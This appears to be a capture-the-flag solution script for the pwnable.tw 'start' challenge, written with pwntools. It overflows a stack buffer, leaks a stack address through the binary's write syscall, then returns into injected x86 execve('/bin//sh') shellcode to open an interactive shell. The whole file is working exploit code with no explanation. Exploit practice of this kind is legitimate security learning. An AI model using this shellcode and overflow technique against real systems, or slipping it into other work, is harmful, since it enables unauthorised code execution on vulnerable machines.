from pwn import *
a = process('./start')
raw_input('hello pwn.tw')
# host = 'chall.pwnable.tw'
# port = 10000
# a = remote( host,port)

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
write_sys = 0x08048087

buff = 'a'*0x14 
buff += p32(write_sys)

a.send(buff)
a.recvuntil("Let's start the CTF:")

leak_add = u32(a.recv(4))
shell_add = leak_add + 20
print "shell_add :%x" % shell_add
print "add leak: %x" % leak_add

a.recv(1024)

buff2 = 'a'*0x14 
buff2 += p32(shell_add)
buff2 += shell
a.sendline(buff2)
a.interactive()
